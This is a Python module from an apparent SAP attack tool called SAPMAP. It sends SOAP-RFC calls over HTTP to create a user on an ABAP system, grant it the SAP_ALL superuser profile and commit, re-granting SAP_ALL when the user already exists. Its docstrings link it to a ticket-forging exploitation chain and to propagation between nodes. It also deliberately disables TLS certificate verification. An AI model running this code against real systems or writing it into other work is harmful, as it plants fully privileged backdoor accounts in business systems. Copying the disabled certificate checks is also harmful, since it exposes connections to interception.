"""SAP SOAP-RFC client (HTTP basic auth).

Lets SAPMAP call RFC modules over HTTP against ABAP targets reachable
only on the ICM HTTP port (no dispatcher, no NW RFC SDK on the SAPMAP
host).  Phase 3a — supports just the FMs needed to ship "Create Remote
User over HTTP": RFC_PING, BAPI_USER_CREATE1, BAPI_USER_PROFILES_ASSIGN,
BAPI_TRANSACTION_COMMIT.

Companion module to sap_soap_rfc.py (which handles MYSAPSSO2-cookie
auth for the ticket-forging exploitation chain).  Both speak the same
SOAP-RFC wire format; they differ only in the auth header they emit.

Why not call SAP's published WSDL with zeep?  Because (1) the WSDL
endpoint requires authentication on most modern systems, (2) it pulls a
non-trivial dependency for four function calls, and (3) the envelope
shape is stable enough that handwritten templates outlive any code-gen
output anyway.
"""
from __future__ import annotations

import base64
import logging
import socket
import ssl
import urllib.error
import urllib.parse
import urllib.request

from sap_soap_envelopes import (
    build_bapi_transaction_commit,
    build_bapi_user_create1,
    build_bapi_user_get_detail,
    build_bapi_user_profiles_assign,
    build_rfc_ping,
    parse_response,
)

logger = logging.getLogger(__name__)

_DEFAULT_PATH = "/sap/bc/soap/rfc"
_DEFAULT_TIMEOUT = 30.0


class SOAPRFCError(Exception):
    """HTTP/transport-layer failure (not an RFC-level error).

    RFC-level errors (ABAP exception, bad credentials, missing auth)
    arrive as structured `parse_response()` results with `ok=False`.
    SOAPRFCError is reserved for problems we can't open a SOAP envelope
    on at all: socket refused, TLS handshake failure, malformed HTTP.
    """


class SOAPRFCSession:
    """One SOAP-RFC connection to an ABAP target.

    A "session" is purely conceptual — every call is a fresh HTTP POST
    with its own basic-auth header.  We keep it as a class so callers
    can hold endpoint+credentials together and we can swap stateful
    auth modes (cookies, OAuth bearer) in later without changing call
    sites.
    """

    def __init__(self, host: str, port: int, client: str,
                 user: str, password: str,
                 https: bool = False,
                 path: str = _DEFAULT_PATH,
                 language: str = "EN",
                 timeout: float = _DEFAULT_TIMEOUT):
        self.host = host
        self.port = int(port)
        self.client = client or "000"
        self.user = user
        self.password = password
        self.https = bool(https)
        self.path = path or _DEFAULT_PATH
        self.language = language or "EN"
        self.timeout = float(timeout)

    # -----------------------------------------------------------------
    # HTTP / transport
    # -----------------------------------------------------------------

    @property
    def endpoint(self) -> str:
        scheme = "https" if self.https else "http"
        query = urllib.parse.urlencode({
            "sap-client": self.client,
            "sap-language": self.language,
        })
        return f"{scheme}://{self.host}:{self.port}{self.path}?{query}"

    def _auth_header(self) -> str:
        token = base64.b64encode(
            f"{self.user}:{self.password}".encode("utf-8")
        ).decode("ascii")
        return f"Basic {token}"

    def _ssl_ctx(self):
        """Self-signed certs are typical for internal SAP systems.
        Verifying would break against most lab + on-prem landscapes."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _post_soap(self, envelope_xml: str) -> str:
        """POST a SOAP envelope, return the response body as text.

        Raises SOAPRFCError on transport failure.  HTTP 500 with a
        SOAP-fault body is treated as a successful HTTP exchange —
        the fault is parsed downstream and surfaced via `error`.
        """
        body = envelope_xml.encode("utf-8")
        req = urllib.request.Request(
            self.endpoint, data=body, method="POST")
        req.add_header("Content-Type", "text/xml; charset=utf-8")
        # Empty quoted SOAPAction is what SAP's ICM expects for the
        # rfc service — non-empty values trigger 'invalid action'.
        req.add_header("SOAPAction", '""')
        req.add_header("Authorization", self._auth_header())
        req.add_header("User-Agent", "SAPMAP/1.0")

        try:
            with urllib.request.urlopen(
                    req, timeout=self.timeout,
                    context=self._ssl_ctx()) as r:
                return r.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            # SAP returns SOAP faults with HTTP 500 (and sometimes 401
            # for auth failure with an HTML body, not a SOAP fault) —
            # we pass the body through to the parser.  If the body is
            # empty/HTML the parser surfaces a descriptive error.
            try:
                return e.read().decode("utf-8", errors="replace")
            except Exception:
                raise SOAPRFCError(
                    f"HTTP {e.code} {e.reason} (no body)") from e
        except urllib.error.URLError as e:
            raise SOAPRFCError(f"URL error: {e.reason}") from e
        except (TimeoutError, socket.timeout) as e:
            raise SOAPRFCError(
                f"timeout after {self.timeout}s") from e
        except Exception as e:
            raise SOAPRFCError(f"{type(e).__name__}: {e}") from e

    # -----------------------------------------------------------------
    # FM-level operations
    # -----------------------------------------------------------------

    def test_connection(self) -> dict:
        """Call RFC_PING.  Returns the parse_response dict.

        Distinguishes between:
          - ok=True               → credentials valid, FM callable
          - ok=False with SOAP    → credentials invalid OR no auth for
                                     SRFC function group
          - SOAPRFCError raised   → host unreachable / wrong port / TLS
        """
        body = build_rfc_ping()
        try:
            response_xml = self._post_soap(body)
        except SOAPRFCError as e:
            return {"ok": False, "params": {}, "tables": {},
                    "error": f"transport: {e}", "raw": ""}
        return parse_response(response_xml, "RFC_PING")

    def bapi_user_create1(self, username: str, password: str,
                          firstname: str = "SAPMAP",
                          lastname: str = "Tool",
                          user_type: str = "A") -> dict:
        body = build_bapi_user_create1(
            username, password, firstname, lastname, user_type)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_USER_CREATE1")

    def bapi_user_profiles_assign(self, username: str,
                                  profiles: list) -> dict:
        body = build_bapi_user_profiles_assign(username, profiles)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_USER_PROFILES_ASSIGN")

    def bapi_transaction_commit(self, wait: bool = True) -> dict:
        body = build_bapi_transaction_commit(wait)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_TRANSACTION_COMMIT")

    def bapi_user_get_detail(self, username: str) -> dict:
        body = build_bapi_user_get_detail(username)
        response_xml = self._post_soap(body)
        return parse_response(response_xml, "BAPI_USER_GET_DETAIL")

    def get_user_profiles(self, username: str) -> dict:
        """High-level: read PROFILES + ACTIVITYGROUPS via BAPI.

        Returns:
          {
            "ok":          bool,   True when BAPI returned, even if
                                   the user has zero profiles
            "profiles":    list[str],   names from PROFILES.BAPIPROF
            "roles":       list[str],   names from ACTIVITYGROUPS.AGR_NAME
            "has_sap_all": bool,   True iff 'SAP_ALL' is in profiles
            "error":       str,    empty on success; populated when the
                                   BAPI itself rejected (S_USER_GRP
                                   missing → call-time auth failure)
          }

        Crucial property for the GUI: a missing-permission RETURN with
        an empty PROFILES table still gives ok=True with profiles=[] —
        the modal can then show "no profiles read" rather than
        pretending the call failed.
        """
        result = self.bapi_user_get_detail(username)
        out = {
            "ok": result["ok"],
            "profiles": [],
            "roles": [],
            "has_sap_all": False,
            "error": result.get("error", ""),
        }
        for row in result["tables"].get("PROFILES", []):
            name = (row.get("BAPIPROF", "") or "").strip()
            if name:
                out["profiles"].append(name)
        for row in result["tables"].get("ACTIVITYGROUPS", []):
            name = (row.get("AGR_NAME", "") or "").strip()
            if name:
                out["roles"].append(name)
        out["has_sap_all"] = "SAP_ALL" in out["profiles"]
        return out

    # -----------------------------------------------------------------
    # High-level orchestration
    # -----------------------------------------------------------------

    def create_user_with_sap_all(self, username: str,
                                 password: str) -> dict:
        """Create user → assign SAP_ALL → commit.

        Stops at the first failed step and surfaces it.  A "user
        already exists" failure on the create step still continues
        into profile assignment — the goal is SAP_ALL on the user,
        not strictly to be the one to create them.

        Returns:
          {
            "ok":      bool,        end-to-end outcome
            "step":    str,         which step failed (or "done")
            "error":   str,         empty on success
            "details": list,        per-step parse_response dicts
                                     [(step_name, parse_dict), ...]
          }
        """
        details = []

        ping = self.test_connection()
        details.append(("ping", ping))
        if not ping["ok"]:
            return {"ok": False, "step": "ping",
                    "error": ping.get("error", "ping failed"),
                    "details": details}

        create = self.bapi_user_create1(username, password)
        details.append(("create", create))
        # "User already exists" is BAPI error 01/102 — don't bail on
        # that one; we still want to (re-)assign SAP_ALL.
        if not create["ok"]:
            err = create.get("error", "")
            already_exists = (
                "already exists" in err.lower()
                or "01102" in err
                or "01 102" in err)
            if not already_exists:
                return {"ok": False, "step": "create",
                        "error": err, "details": details}

        assign = self.bapi_user_profiles_assign(username, ["SAP_ALL"])
        details.append(("profiles", assign))
        if not assign["ok"]:
            return {"ok": False, "step": "profiles",
                    "error": assign.get("error", "assign failed"),
                    "details": details}

        commit = self.bapi_transaction_commit(wait=True)
        details.append(("commit", commit))
        if not commit["ok"]:
            return {"ok": False, "step": "commit",
                    "error": commit.get("error", "commit failed"),
                    "details": details}

        return {"ok": True, "step": "done", "error": "",
                "details": details}


def create_user_via_soap(host: str, port: int, client: str,
                         user: str, password: str,
                         new_username: str, new_password: str,
                         https: bool = False) -> dict:
    """Create new_username/new_password with SAP_ALL via SOAP-RFC.

    Returns a dict shaped like sapmap_rfc.create_user_via_bapi so the
    propagate_from_node fast path can call either implementation
    interchangeably:

        {"success": bool, "message": str, "username": str}

    `success=True` means the user exists with SAP_ALL after this call —
    whether we created them fresh or hit "already exists" + SAP_ALL was
    successfully (re-)assigned.
    """
    sess = SOAPRFCSession(
        host=host, port=int(port), client=client or "000",
        user=user, password=password, https=bool(https),
    )
    outcome = sess.create_user_with_sap_all(new_username, new_password)
    if outcome["ok"]:
        return {
            "success": True,
            "message": (f"User {new_username} created with SAP_ALL "
                        f"via SOAP-RFC"),
            "username": new_username,
        }
    return {
        "success": False,
        "message": (f"SOAP-RFC failed at step={outcome['step']}: "
                    f"{outcome['error']}"),
        "username": new_username,
    }
